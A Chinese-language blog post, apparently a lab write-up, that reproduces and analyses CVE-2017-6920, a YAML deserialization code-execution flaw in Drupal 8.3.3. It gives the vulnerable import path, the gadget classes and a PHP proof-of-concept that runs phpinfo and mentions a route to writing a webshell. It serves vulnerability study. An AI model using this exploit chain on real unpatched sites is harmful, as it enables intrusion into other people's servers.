<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Drupal YAML 反序列化代码执行漏洞(CVE-2017-6920) - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Drupal YAML 反序列化代码执行漏洞(CVE-2017-6920)" />
<meta property="og:description" content="事件背景 框架漏洞收集
老外的CMS框架，比较复杂，数据流向太长，调试需要消耗较多的时间。
漏洞说明 1. 漏洞原理：2017年6月21日，Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。
2. 组件描述：Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。
3. 影响版本： 8.0.0~8.3.3
漏洞复现 环境搭建：GitHub - drupal/drupal at 8.3.3
这里可能需要利用docker环境的命令配置一下，我自己的环境为：windows10、PHP7.1、电脑带有docker可使用composer命令生成vendor目录、需要提供yaml环境（https://www.cnblogs.com/yycode/p/16039854.html）、在php.ini文件中添加”yaml.decode_php=On“
然后访问/core/install.php进入安装界面，简单填数据库的信息安装即可
登录后访问路径/admin/config/development/configuration/single/import
向输入框输入POC
点击import，可以看到phpinfo界面，说明POC攻击成功
漏洞分析 drupal8.3.3为开源框架，可以直接审计代码进行调试，根据网上相关漏洞的信息，可以得知本漏洞是yaml_parse()触发的yaml php反序列化，于是先找到该函数的出现的点
有且仅有一个，因此可以断定就是这里，进入看看
这里可以在PHP手册看到该函数的作用
可以看到第一个参数为YAML格式字符串，而函数的作用为将全部或部分 YAML 文档流转换为 PHP 变量，还有一个注意事项
大概意思为：如果使用!php/object则会进行一次反序列化，这个开关由ini的yaml.decode_php控制，因此大概能知道这个函数如果在特定条件下会触发反序列化，而我们现在需要的是控制第一个参数，即$raw
步入Yaml.php::decode查看是否能实现与YamlPecl.php::decode进行链接，步入getSerializer查看一下
可以看到，只要存在yaml环境即可步入第一个条件判断，这也是为什么需要yaml环境了，再去看有没有可控参数，最后定位到ConfigSingleImportForm.php文件
可以看到Yaml::decode()中参数可控因此直接在这利用即可，不过还有一个问题就是利用哪个文件进行反序列化，这个需要查看多个php类文件，最后定位在
vendor\guzzlehttp\guzzle\src\Cookie\FileCookieJar.php
\vendor\guzzlehttp\psr7\src\FnStream.php
一个可以直接写webshell，另一个是可以执行无参函数
最后POC为：
&lt;?php namespace GuzzleHttp\Psr7; class FnStream { public function __construct(array $methods){ $this-&gt;methods = $methods; // Create the functions on the class foreach ($methods as $name =&gt; $fn) { $this-&gt;{&#39;_fn_&#39; ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/d94dfcd38740dd3d4a8e4265c0d854bf/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-28T10:32:37+08:00" />
<meta property="article:modified_time" content="2023-07-28T10:32:37+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Drupal YAML 反序列化代码执行漏洞(CVE-2017-6920)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 id="CdaJV">事件背景</h2> 
<p id="u6cb28fc5">框架漏洞收集</p> 
<p>老外的CMS框架，比较复杂，数据流向太长，调试需要消耗较多的时间。</p> 
<h2 id="nWpWy">漏洞说明</h2> 
<p id="u78f33b30">1. 漏洞原理：2017年6月21日，Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。</p> 
<p id="u1f7cef28">2. 组件描述：Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。</p> 
<p id="u34c16f2c">3. 影响版本： 8.0.0~8.3.3</p> 
<h2 id="G8nBC">漏洞复现</h2> 
<p id="u40dbf792">环境搭建：<a href="https://github.com/drupal/drupal/tree/8.3.3" title="GitHub - drupal/drupal at 8.3.3">GitHub - drupal/drupal at 8.3.3</a></p> 
<p id="u9a56e4f3">这里可能需要利用docker环境的命令配置一下，我自己的环境为：windows10、PHP7.1、电脑带有docker可使用composer命令生成vendor目录、需要提供yaml环境（<a href="https://www.cnblogs.com/yycode/p/16039854.html" rel="nofollow" title="https://www.cnblogs.com/yycode/p/16039854.html">https://www.cnblogs.com/yycode/p/16039854.html</a>）、在php.ini文件中添加”yaml.decode_php=On“</p> 
<p id="u514aad55"></p> 
<p class="img-center"><img alt="" height="639" id="ufd88bffe" src="https://images2.imgbox.com/a9/36/CvY2paeN_o.png" width="1200"></p> 
<p id="u0d3be59e">然后访问/core/install.php进入安装界面，简单填数据库的信息安装即可</p> 
<p id="ue492bc57"></p> 
<p class="img-center"><img alt="" height="904" id="ue915bb68" src="https://images2.imgbox.com/dd/67/rmLmYLBZ_o.png" width="1200"></p> 
<p id="u3e53fe6a">登录后访问路径/admin/config/development/configuration/single/import</p> 
<p id="u836ae42c"></p> 
<p class="img-center"><img alt="" height="885" id="ueca46552" src="https://images2.imgbox.com/1c/ce/Rengq7MJ_o.png" width="1200"></p> 
<p id="uc075d2fc">向输入框输入POC</p> 
<p id="u088d20c5"></p> 
<p class="img-center"><img alt="" height="680" id="u47e1e799" src="https://images2.imgbox.com/22/9f/fArJhylq_o.png" width="1200"></p> 
<p id="ud4851270">点击import，可以看到phpinfo界面，说明POC攻击成功</p> 
<p id="u658d4333"></p> 
<p class="img-center"><img alt="" height="840" id="u35863999" src="https://images2.imgbox.com/99/fe/d9KVpRSU_o.png" width="1200"></p> 
<p id="ue7cc3459"></p> 
<h2 id="i0yNi">漏洞分析</h2> 
<p id="u0e2a213c">drupal8.3.3为开源框架，可以直接审计代码进行调试，根据网上相关漏洞的信息，可以得知本漏洞是yaml_parse()触发的yaml php反序列化，于是先找到该函数的出现的点</p> 
<p id="u7eb6c4ed"></p> 
<p class="img-center"><img alt="" height="348" id="ub21a7cf7" src="https://images2.imgbox.com/16/8f/n2yFzM0k_o.png" width="692"></p> 
<p id="ua797609c">有且仅有一个，因此可以断定就是这里，进入看看</p> 
<p id="u76774bf6"></p> 
<p class="img-center"><img alt="" height="816" id="ud78acde1" src="https://images2.imgbox.com/3f/85/iL8StI5H_o.png" width="1090"></p> 
<p id="ub0e1fc99">这里可以在PHP手册看到该函数的作用</p> 
<p id="u24bd147d"></p> 
<p class="img-center"><img alt="" height="835" id="u046e241b" src="https://images2.imgbox.com/41/6f/dDWDSpQl_o.png" width="1144"></p> 
<p id="ua0e04532">可以看到第一个参数为YAML格式字符串，而函数的作用为将全部或部分 YAML 文档流转换为 PHP 变量，还有一个注意事项</p> 
<p id="uc605fd92"></p> 
<p class="img-center"><img alt="" height="311" id="u8f8d1df6" src="https://images2.imgbox.com/6a/5d/LEcpGq76_o.png" width="1200"></p> 
<p id="u766c9c8a">大概意思为：如果使用!php/object则会进行一次反序列化，这个开关由ini的yaml.decode_php控制，因此大概能知道这个函数如果在特定条件下会触发反序列化，而我们现在需要的是控制第一个参数，即$raw</p> 
<p id="u2a0ea999"></p> 
<p class="img-center"><img alt="" height="628" id="u2919b226" src="https://images2.imgbox.com/6a/de/sr3IVmv2_o.png" width="1200"></p> 
<p id="u49657e52">步入Yaml.php::decode查看是否能实现与YamlPecl.php::decode进行链接，步入getSerializer查看一下</p> 
<p id="u9eb8a533"></p> 
<p class="img-center"><img alt="" height="661" id="u1a5185e5" src="https://images2.imgbox.com/f0/e9/dDhT81JX_o.png" width="884"></p> 
<p id="ucbe926c5">可以看到，只要存在yaml环境即可步入第一个条件判断，这也是为什么需要yaml环境了，再去看有没有可控参数，最后定位到ConfigSingleImportForm.php文件</p> 
<p id="u8aeb2832"></p> 
<p class="img-center"><img alt="" height="860" id="ub2f6786c" src="https://images2.imgbox.com/37/9d/U8UVTXtS_o.png" width="1200"></p> 
<p id="ua0a04807">可以看到Yaml::decode()中参数可控因此直接在这利用即可，不过还有一个问题就是利用哪个文件进行反序列化，这个需要查看多个php类文件，最后定位在</p> 
<p id="u579e41e2">vendor\guzzlehttp\guzzle\src\Cookie\FileCookieJar.php</p> 
<p id="uf4d7d5ba">\vendor\guzzlehttp\psr7\src\FnStream.php</p> 
<p id="u47d73355">一个可以直接写webshell，另一个是可以执行无参函数</p> 
<p id="uf5e75026"></p> 
<p class="img-center"><img alt="" height="930" id="u937a0d57" src="https://images2.imgbox.com/26/dd/E7phKAh9_o.png" width="1200"></p> 
<p id="ufefb27b2">最后POC为：</p> 
<pre><code class="language-php">&lt;?php

namespace GuzzleHttp\Psr7;

class FnStream {

    public function __construct(array $methods){

        $this-&gt;methods = $methods;

        // Create the functions on the class

        foreach ($methods as $name =&gt; $fn) {

        $this-&gt;{'_fn_' . $name} = $fn;

        }

    }

    public function __destruct(){

        if (isset($this-&gt;_fn_close)) {

        call_user_func($this-&gt;_fn_close);

        }

    }

}

$fn = new FnStream(array('close'=&gt;'phpinfo'));

echo(serialize($fn))

?&gt;</code></pre> 
<p id="u4aefa7fd">最后在生成的payload前面增加 !php/object 修改为yaml格式即可，除了yaml的一个触发点，其它和普通的PHP反序列化没什么区别</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/f78cfa7522ab93027f393733b030b64c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【华为云-云驻共创】多沙箱容器运行时Kuasar开发上手实践</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a0156b33feaf1ea172e3ecfbaf70a4d6/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">DRUPAL 8.x远程代码执行漏洞(CVE-2018-7600)</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>